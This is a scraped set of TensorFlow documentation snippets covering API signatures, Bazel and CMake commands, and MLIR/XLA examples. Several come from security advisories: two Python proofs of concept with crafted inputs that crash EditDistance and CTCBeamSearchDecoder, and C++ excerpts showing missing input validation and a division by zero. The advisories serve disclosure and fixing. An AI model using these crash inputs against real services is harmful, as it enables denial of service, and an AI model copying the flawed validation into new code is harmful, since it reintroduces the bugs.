TITLE: Getting Feature Dictionary in AverageWordVecSpec
DESCRIPTION: Returns a dictionary that describes the expected features when processing data, typically used for parsing TFRecord files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_6

LANGUAGE: python
CODE:
```
get_name_to_features()
```

----------------------------------------

TITLE: Finalizing Process Unit in TFLite Metadata Builder (Python)
DESCRIPTION: This Python function call is used to finalize the creation of a `ProcessUnit` object within a FlatBuffers builder when constructing TFLite metadata. It is typically invoked after all fields for the `ProcessUnit` have been added using the builder methods. The `builder` object is a required parameter, representing the current FlatBuffers builder instance being used to serialize the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ProcessUnitEnd(
    builder
)
```

----------------------------------------

TITLE: Running Bazel Test for Custom Op
DESCRIPTION: This shell command executes the Bazel build target for the custom op's Python test suite. Bazel will build necessary dependencies and run the tests defined in `multiplex_1_test.py`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_12

LANGUAGE: shell
CODE:
```
$ bazel test //third_party/tensorflow/google/g3doc/example/multiplex_1:multiplex_1_test
```

----------------------------------------

TITLE: MutableOpResolver AddBuiltin Signature (C++)
DESCRIPTION: This C++ snippet shows the signature of the `AddBuiltin` function used in `MutableOpResolver` for registering built-in operator kernels. It includes optional `min_version` and `max_version` parameters, which default to 1.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_5

LANGUAGE: C++
CODE:
```
void AddBuiltin(tflite::BuiltinOperator op, TfLiteRegistration* registration,
                int min_version = 1, int max_version = 1);
```

----------------------------------------

TITLE: Building TFLite Shared Library (Desktop) - Shell
DESCRIPTION: This shell command shows how to build the base TensorFlow Lite C++ shared library target for desktop platforms using Bazel. It specifies optimized compilation and requires the C++17 standard.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_8

LANGUAGE: Shell
CODE:
```
bazel build -c opt  --cxxopt=--std=c++17 \
  //tmp:tensorflowlite
```

----------------------------------------

TITLE: Reading Integer Parameter C++
DESCRIPTION: Provides an example of how to safely read a single integer parameter ('num_steps') from the `TransformFuncContext` within a C++ graph transform, using `GetOneInt32Parameter`. It includes error handling and a default value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_16

LANGUAGE: C++
CODE:
```
TF_RETURN_IF_ERROR(context.GetOneInt32Parameter("num_steps", 256, &num_steps));
```

----------------------------------------

TITLE: Generating ILSVRC Ground Truth Labels Python
DESCRIPTION: This snippet shows how to use a Python script provided in the TensorFlow Lite repository to convert the ILSVRC 2012 validation ground truth file (containing synset IDs) into a category labels file required by the evaluation binary. It requires setting environment variables for the devkit path and the desired output path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_0

LANGUAGE: Python
CODE:
```
ILSVRC_2012_DEVKIT_DIR=[set to path to ILSVRC 2012 devkit]
VALIDATION_LABELS=[set to  path to output]

python tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/generate_validation_labels.py \
--ilsvrc_devkit_dir=${ILSVRC_2012_DEVKIT_DIR} \
--validation_labels_output=${VALIDATION_LABELS}
```

----------------------------------------

TITLE: Creating Image Classifier Model in Python
DESCRIPTION: This snippet shows the signature for the `create` class method used to initialize and train an image classification model. It takes training and optional validation data, a model specification, and various training hyperparameters (batch size, epochs, learning rate, etc.) as input. It returns an instance of an ImageClassifier model trained on the provided data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/create.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
tflite_model_maker.image_classifier.create(
    train_data,
    model_spec='efficientnet_lite0',
    validation_data=None,
    batch_size=None,
    epochs=None,
    steps_per_epoch=None,
    train_whole_model=None,
    dropout_rate=None,
    learning_rate=None,
    momentum=None,
    shuffle=False,
    use_augmentation=False,
    use_hub_library=True,
    warmup_steps=None,
    model_dir=None,
    do_train=True
)
```

----------------------------------------

TITLE: Defining nvidia-curand-cu12 Dependency
DESCRIPTION: Specifies the exact version (10.3.6.82) for the 'nvidia-curand-cu12' package and provides multiple SHA256 hashes. This requirement ensures the installation of a specific version of the cuRAND library for CUDA 12, used for random number generation, and validates the package's integrity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_6

LANGUAGE: Python Requirements
CODE:
```
nvidia-curand-cu12==10.3.6.82 \
    --hash=sha256:0631ba65231260ad832ce233ddda57e7b3b7158eabf000d78e46cbb5bd5b7aae \
    --hash=sha256:2823fb27de4e44dbb22394a6adf53aa6e1b013aca0f8c22867d1cfae58405536 \
    --hash=sha256:36aabeb5990297bbce3df324ea7c7c13c3aabb140c86d50ab3b23e4ec61672f1
```

----------------------------------------

TITLE: Updating Python Dependency Lock File Bazel Shell
DESCRIPTION: Executes the Bazel target responsible for updating the `requirements_lock_<python version>.txt` file for a specific Python version. This command runs an internal script that typically invokes `pip-compile` to generate the pinned dependency list based on the `.in` file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
bazel run //ci/official/requirements_updater:requirements.update --repo_env=HERMETIC_PYTHON_VERSION=3.12
```

----------------------------------------

TITLE: Defining Simple OpTypePattern C++ (Indented)
DESCRIPTION: Provides an indented version of the simple `OpTypePattern` definition in C++ using initializer lists. The indentation clarifies the nested structure of the pattern, matching a Conv2D with any first input and a Const second input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_12

LANGUAGE: C++
CODE:
```
OpTypePattern conv_pattern({
  "Conv2D",
  {
    {"*"},
    {"Const"}
  }
});
```

----------------------------------------

TITLE: Executing Setup Script (Bash)
DESCRIPTION: This command executes the `setup.sh` script, which is designed to configure the necessary environment for running the benchmark. Successful execution depends on the presence and executable permission of the `setup.sh` file. The output will consist of messages generated by the setup script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/backends/cpu/benchmarks/e2e/gemma2/pytorch_2b/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
bash setup.sh
```

----------------------------------------

TITLE: Install Python future module
DESCRIPTION: Installs the 'future' Python module required for some TensorFlow build processes. Use the '--user' flag to install into the user's site-packages directory, avoiding the need for root privileges.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
pip install future --user
```

----------------------------------------

TITLE: Registering MLIR Operation C++
DESCRIPTION: Registers a custom MLIR operation (`YourOp`) with the MLIR interpreter. This macro is used within the C++ implementation file for a new dialect to make its operations available for execution by the interpreter. It is a required step after implementing the operation's execution logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_interpreter/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
REGISTER_MLIR_INTERPRETER_OP(YourOp)
```

----------------------------------------

TITLE: Access BoundingBoxProperties Coordinate Type Python
DESCRIPTION: Retrieves the coordinate type of the bounding box properties. This method returns the enumerated value representing the coordinate system used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_1

LANGUAGE: Python
CODE:
```
CoordinateType()
```

----------------------------------------

TITLE: Flawed Input Validation in BandedTriangularSolve (C++)
DESCRIPTION: This C++ snippet shows the `ValidateInputTensors` function from the vulnerable `BandedTriangularSolve` kernel implementation. It illustrates the inadequate validation logic which only checks if input tensors (`in0` and `in1`) have at least 2 dimensions, but fails to check if they are empty, allowing the Python exploit to succeed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-100.md#_snippet_1

LANGUAGE: c++
CODE:
```
void ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0, const Tensor& in1) {
  OP_REQUIRES(
      ctx, in0.dims() >= 2,
      errors::InvalidArgument("In[0] ndims must be >= 2: ", in0.dims()));

  OP_REQUIRES(
      ctx, in1.dims() >= 2,
      errors::InvalidArgument("In[1] ndims must be >= 2: ", in1.dims()));
}
```

----------------------------------------

TITLE: Checking for Input Tensor Groups in Python
DESCRIPTION: Checks if the input tensor groups field is present or null within the schema. Use this method to verify if input tensor groups exist.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_14

LANGUAGE: python
CODE:
```
InputTensorGroupsIsNone()
```

----------------------------------------

TITLE: Concatenating 2D Arrays in XLA C++
DESCRIPTION: Illustrates how to concatenate 2-dimensional arrays using the `Concat` operation in XLA. It shows two input 2D arrays (`a` and `b`) and the resulting 2D array after concatenating them along dimension 0.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_9

LANGUAGE: C++
CODE:
```
let a = {
{1, 2},
{3, 4},
{5, 6},
};
let b = {
{7, 8},
};
Concat({a, b}, 0)
>>> {
{1, 2},
{3, 4},
{5, 6},
{7, 8},
}
```

----------------------------------------

TITLE: MLIR after Extracting Head/Tail Outside Compilation Pass
DESCRIPTION: This MLIR snippet shows the result after the head/tail extraction pass. Operations marked for outside compilation (`tf.A` and `tf.C`) have been moved into separate `tf_device.launch` operations targeting the CPU, effectively wrapping the original device cluster (`tf.B`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_26

LANGUAGE: mlir
CODE:
```
%0 = "tf_device.launch"() ( {
  %3 = "tf.A"(%arg0) : (tensor<i32>) -> tensor<i32>
  tf_device.return %3 : tensor<i32>
}) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> ()
%1 = "tf_device.cluster"() ( {
  %3 = "tf.B"(%0) : (tensor<i32>) -> tensor<i32>
  tf_device.return %3 : tensor<i32>
}) {device_assignment = [], num_cores_per_replica = 1 : i64, padding_map = [], step_marker_location = "", topology = ""} : () -> tensor<i32>
%2 = "tf_device.launch"() ( {
  %3 = "tf.C"(%1) : (tensor<i32>) -> tensor<i32>
  tf_device.return %3 : tensor<i32>
}) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> ()
return %2 : tensor<i32>
```

----------------------------------------

TITLE: Initializing ProcessUnitT From Object Python
DESCRIPTION: This class method initializes a `ProcessUnitT` object from an existing `processUnit` object. This is typically used to create a new `ProcessUnitT` instance based on the data of another instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    processUnit
)
```

----------------------------------------

TITLE: Defining MLIR Library - MHLO TypeConversion - CMake
DESCRIPTION: Defines a CMake target for the `MhloTypeConversion` MLIR library. Its source is `type_conversion.cc`, it links the MLIR `Core` component, and publicly links against the `MhloDialect`, core MLIR components, and other relevant dialects and transformations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/utils/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloTypeConversion
  type_conversion.cc

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MLIRIR
  MLIRFuncDialect
  MLIRFuncTransforms
  MLIRTensorDialect
  StablehloOps
)
```

----------------------------------------

TITLE: Defining XlaBuilder::Send operation (C++)
DESCRIPTION: Defines the synchronous client API signature for the XLA Send operation using the XlaBuilder. This operation sends the provided operand data to a corresponding Recv instruction using a specified channel handle and does not produce any output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_33

LANGUAGE: C++
CODE:
```
Send(operand, channel_handle)
```

----------------------------------------

TITLE: Initializing Object from Buffer Python
DESCRIPTION: This instance method initializes the object using a provided buffer and position. It is typically used to set up an object instance to read data from a specific location within a flatbuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_2

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Triggering Null Pointer Dereference using EditDistance Python
DESCRIPTION: This Python snippet demonstrates how to provide crafted input tensors to `tf.raw_ops.EditDistance` that exploit a null pointer dereference vulnerability. It uses specific shapes and values for hypothesis and truth tensors, particularly empty truth tensors and a zero-shaped hypothesis shape, which bypass validation and lead to the issue during output tensor initialization. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-052.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)
hypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)
hypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)
truth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)
truth_values = tf.constant([], shape=[0], dtype=tf.float32)
truth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)

tf.raw_ops.EditDistance(
    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,
    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,
    truth_values=truth_values, truth_shape=truth_shape, normalize=True)
```

----------------------------------------

TITLE: Checking TFLite AssociatedFile Buffer Identifier (Python)
DESCRIPTION: Checks if a given buffer (`buf`) at a specific `offset` contains the correct identifier for a TFLite `AssociatedFile` flatbuffer. This class method is used to validate the buffer format, optionally supporting size-prefixed buffers. It returns a boolean indicating whether the identifier matches.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
AssociatedFileBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Triggering CTCBeamSearchDecoder Segfault - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates a vulnerability in `tf.raw_ops.CTCBeamSearchDecoder`. By providing an empty `inputs` tensor and negative values in `sequence_length`, the code triggers a segmentation fault due to improper input validation, leading to a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-069.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

inputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)
sequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],
shape=[8], dtype=tf.int32)
beam_width = 10
top_paths = 3
merge_repeated = True

tf.raw_ops.CTCBeamSearchDecoder(
  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,
  top_paths=top_paths, merge_repeated=merge_repeated)
```

----------------------------------------

TITLE: Running TensorFlow wav_to_spectrogram Default - Bash
DESCRIPTION: This command executes the compiled `wav_to_spectrogram` binary using default settings. It processes a built-in test audio file and saves the resulting spectrogram as `spectrogram.png` in the current directory. Prerequisites include successfully building the example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/wav_to_spectrogram/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/wav_to_spectrogram/wav_to_spectrogram
```

----------------------------------------

TITLE: Compiling Sharded HLO Without Running Bash
DESCRIPTION: This command compiles the specified HLO module (`my-hlo.txt`) using the XLA multi-host HLO runner but skips the execution phase by setting the `--run=false` flag. This mode typically requires only a single GPU unless using the autotuning cache.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_1

LANGUAGE: bash
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- --run=false my-hlo.txt
```

----------------------------------------

TITLE: Example Clamp Operation Result - Pseudo-code
DESCRIPTION: This example illustrates the output of the Clamp operation. Given an input vector 'operand', a scalar 'min', and a scalar 'max', the result is a new vector where each element of the operand is clamped to be within the range [min, max].
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_6

LANGUAGE: Pseudo-code
CODE:
```
let operand: s32[3] = {-1, 5, 9};
let min: s32 = 0;
let max: s32 = 6;
==>
Clamp(min, operand, max) = s32[3]{0, 5, 6};
```

----------------------------------------

TITLE: Calculating Row Bytes TensorFlow Lite C++
DESCRIPTION: This C++ snippet from the TensorFlow Lite hashtable lookup kernel calculates the number of bytes per row by dividing the total bytes of a tensor by its first dimension size. It is the location of a division by zero vulnerability if the first dimension size (`num_rows`) is zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-090.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int num_rows = SizeOfDimension(value, 0);
const int row_bytes = value->bytes / num_rows;
```

----------------------------------------

TITLE: Check RegexTokenizerOptions Buffer Identifier Python
DESCRIPTION: Class method to check if the provided buffer contains the correct FlatBuffers identifier for `RegexTokenizerOptions`. It verifies the buffer's format before attempting to deserialize.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptions.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
RegexTokenizerOptionsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Run Bazel Tests XLA ARM64 CPU (Shell)
DESCRIPTION: Executes `bazel test` for XLA ARM64 CPU targets. It applies tag filters excluding GPU and ARM-specific tests, uses warnings, RBE cross-compile, and non-CCL configurations, and configures output, profiling, and parallelism. It's set to build tests only.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_15

LANGUAGE: shell
CODE:
```
bazel test --build_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --test_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --config=warnings --config=rbe_cross_compile_linux_arm64 --config=nonccl --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --build_tests_only -- //xla/... //build_tools/... @local_tsl//tsl/...
```

----------------------------------------

TITLE: Optimized Code for Constant True Condition - TensorFlow Python
DESCRIPTION: This snippet shows the optimized code resulting from a `tf.cond` where the condition evaluates to a constant True value. The conditional operation is removed, and only the true branch is kept.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_1

LANGUAGE: Python
CODE:
```
x = 1
y = 3 * x
```

----------------------------------------

TITLE: Indexing into a Tuple in XLA HLO
DESCRIPTION: Illustrates the `gettupleelement` operation, used to extract an element from a tuple. The index must be a compile-time constant to allow for shape inference. This operation is conceptually similar to `std::get<N>(t)` in C++.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_23

LANGUAGE: XLA HLO / C++-like
CODE:
```
let v: f32[10] = f32[10]{0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
let s: s32 = 5;
let t: (f32[10], s32) = tuple(v, s);
let element_1: s32 = gettupleelement(t, 1);  // Inferred shape matches s32.
```

----------------------------------------

TITLE: Configuring TensorFlow Source Directory in CMake
DESCRIPTION: Defines a CMake cache variable `TENSORFLOW_SOURCE_DIR` for specifying the TensorFlow project path. If not explicitly set by the user, it defaults the variable to a path relative to the current CMakeLists.txt file, assuming a specific directory structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
set(TENSORFLOW_SOURCE_DIR "" CACHE PATH
  "Directory that contains the TensorFlow project"
)
if(NOT TENSORFLOW_SOURCE_DIR)
  get_filename_component(TENSORFLOW_SOURCE_DIR
    "${CMAKE_CURRENT_LIST_DIR}/../../../../"
    ABSOLUTE
  )
endif()
```

----------------------------------------

TITLE: Enable Prefab Feature Gradle
DESCRIPTION: Enables the Prefab build feature within the Android module's build.gradle file. This is required to access C/C++ dependencies imported from AARs, such as the TFLite GMS C++ library, from your CMake script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_1

LANGUAGE: Gradle
CODE:
```
buildFeatures {
  prefab = true
}
```

----------------------------------------

TITLE: Dumping/Loading Single File Autotune Results in XLA (Shell)
DESCRIPTION: These flags allow dumping all autotuning results for a given HLO module to a single file or loading results from such a file. The file format (textproto or binary protobuf) is determined by the file extension (.txt or .textproto for textproto, others for binary protobuf).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/persisted_autotuning.md#_snippet_1

LANGUAGE: Shell
CODE:
```
--xla_gpu_dump_autotune_results_to=
--xla_gpu_load_autotune_results_from=
```

----------------------------------------

TITLE: MLIR Device Cluster before Head/Tail Extraction Pass
DESCRIPTION: This MLIR snippet shows a `tf_device.cluster` containing operations, some of which are marked with `_xla_outside_compilation`. It represents the state before the pass extracts the head and tail operations with this annotation to separate host launches.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_25

LANGUAGE: mlir
CODE:
```
  %cluster = "tf_device.cluster"() ( {
    %a = "tf.A"(%arg0) {_xla_outside_compilation = "cluster1"} : (tensor<i32>) -> tensor<i32>
    %b = "tf.B"(%a) : (tensor<i32>) -> tensor<i32>
    %c = "tf.C"(%b) {_xla_outside_compilation = "cluster1"} : (tensor<i32>) -> tensor<i32>
    tf_device.return %c : tensor<i32>
  }) {num_cores_per_replica = 1, step_marker_location = "", padding_map = [], topology = "", device_assignment = []} : () -> tensor<i32>
  return %cluster : tensor<i32>
```

----------------------------------------

TITLE: Starting Output Tensor Metadata Vector in TFLite Metadata Python
DESCRIPTION: This Python function is used to start or prepare a vector (likely a FlatBuffers vector) that will hold output tensor metadata. It takes a builder object (presumably a FlatBuffers builder) and the number of elements (`numElems`) that the vector will contain. This function is typically called during the process of building the metadata schema for a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartOutputTensorMetadataVector.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartOutputTensorMetadataVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Outlining tf_device.launch in MLIR
DESCRIPTION: Similar to cluster outlining, this pass transforms a `tf_device.launch` operation by outlining its body into a function. The original operation is replaced by `tf_device.launch_func`, which invokes the new function on the specified device, passing captured implicit operands as explicit arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_6

LANGUAGE: MLIR
CODE:
```
func @computation(%arg0: tensor<i32>) -> tensor<i32> {
  %launch = "tf_device.launch"() ( {
    %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
    tf_device.return %identity : tensor<i32>
  }) {device = "some_device"} : () -> (tensor<i32>)
  return %launch : tensor<i32>
}
```

LANGUAGE: MLIR
CODE:
```
func @computation(%arg0: tensor<i32>) -> tensor<i32> {
  %launch = "tf_device.launch_func"(%arg0) {device = "some_device", func = @_func} : (tensor<i32>) -> tensor<i32>
  return %launch : tensor<i32>
}

func @_func(%arg0: tensor<i32>) -> tensor<i32> {
  %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
  return %identity : tensor<i32>
}
```

----------------------------------------

TITLE: Viewing Rendered Graphviz PDF (Shell)
DESCRIPTION: This command opens a generated Graphviz PDF file, such as one created by rendering the output of `tflite_convert` via `dot`, in the Google Chrome browser. It assumes the PDF file (`/tmp/foo.dot.pdf`) exists. While Chrome is used in the example, any PDF viewer capable of handling potentially large pages can be used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_13

LANGUAGE: Shell
CODE:
```
google-chrome /tmp/foo.dot.pdf
```

----------------------------------------

TITLE: Initializing ValueRangeT from Buffer (Python)
DESCRIPTION: A class method to initialize a `ValueRangeT` instance by deserializing data from a byte buffer (`buf`) starting at a specified position (`pos`). This is commonly used when reading FlatBuffers data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Creating Metadata Writer from Info Objects (TFLite Support, Python)
DESCRIPTION: Constructs a MetadataWriter using structured metadata information classes (`GeneralMd`, `BertInputTensorsMd`, `ClassificationTensorMd`). It takes the model buffer and optional info objects for general, input, and output metadata. Default metadata will be generated for any info objects not provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/GeneralMd"><code>tflite_support.metadata_writers.metadata_info.GeneralMd</code></a>] = None,
    input_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/BertInputTensorsMd"><code>tflite_support.metadata_writers.metadata_info.BertInputTensorsMd</code></a>] = None,
    output_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/ClassificationTensorMd"><code>tflite_support.metadata_writers.metadata_info.ClassificationTensorMd</code></a>] = None
)
```

----------------------------------------

TITLE: Setting Target Properties for Test Suite (CMake)
DESCRIPTION: Sets properties for the 'check-mlir-hlo-lit' target. Specifically, it places the target into the 'Tests' folder in generated build environments (like Visual Studio or Xcode) for better organization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
set_target_properties(check-mlir-hlo-lit PROPERTIES FOLDER "Tests")
```

----------------------------------------

TITLE: Processing Output Properties in TensorFlow Grappler Constant Folding (C++)
DESCRIPTION: This C++ snippet from the TensorFlow Grappler constant folding optimization iterates through output tensor properties (`output_props`). It attempts to construct a `PartialTensorShape` from the output shape. This construction step was the source of the vulnerability (TFSA-2022-053) when untrusted input shapes triggered internal checks, leading to a denial of service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-053.md#_snippet_0

LANGUAGE: C++
CODE:
```
  for (const auto& output_prop : output_props) {
    const PartialTensorShape output_shape(output_prop.shape());
    // ...
  }
```

----------------------------------------

TITLE: Getting Output Process Units Count in Python
DESCRIPTION: Retrieves the number of entries in the output process units list. This method returns the size of the output process units array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_22

LANGUAGE: python
CODE:
```
OutputProcessUnitsLength()
```

----------------------------------------

TITLE: DynamicUpdateSlice 2D Example (Code)
DESCRIPTION: An illustrative example demonstrating the `DynamicUpdateSlice` operation on a 2-dimensional array. It shows the input array (`b`), the 2D update slice (`u`), the start indices (`s`), and the resulting 2D array after the update.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_21

LANGUAGE: Code
CODE:
```
let b =
{ {0.0,  1.0,  2.0},
{3.0,  4.0,  5.0},
{6.0,  7.0,  8.0},
{9.0, 10.0, 11.0} }
let u =
{ {12.0,  13.0},
{14.0,  15.0},
{16.0,  17.0} }

let s = {1, 1}

DynamicUpdateSlice(b, u, s) produces:
{ {0.0,  1.0,  2.0},
{3.0, 12.0, 13.0},
{6.0, 14.0, 15.0},
{9.0, 16.0, 17.0} }
```

----------------------------------------

TITLE: Reading Chunked Proto from Disk in C++
DESCRIPTION: Shows how to declare a `ModelConfig` object and use the static `Merger::Read` method in C++ to deserialize a chunked proto from a specified file path directly into the object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/g3doc/in-depth-guide.md#_snippet_4

LANGUAGE: c++
CODE:
```
ModelConfig my_proto;
string export_dir = "...";
Merger::Read(export_dir, &my_proto);
```

----------------------------------------

TITLE: Defining Variadic Reduce Function (Python)
DESCRIPTION: This Python-like function defines the core computation for a variadic reduction. It takes current reduced values and new input values, returning the updated reduced values. The example shows finding the maximum value and its index in parallel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_26

LANGUAGE: Python
CODE:
```
f: (Float, Int, Float, Int) -> Float, Int
f(max, argmax, value, index):
  if value >= max:
    return (value, index)
  else:
    return (max, argmax)
```

----------------------------------------

TITLE: Defining Custom TFLite Benchmark Binary (Bazel)
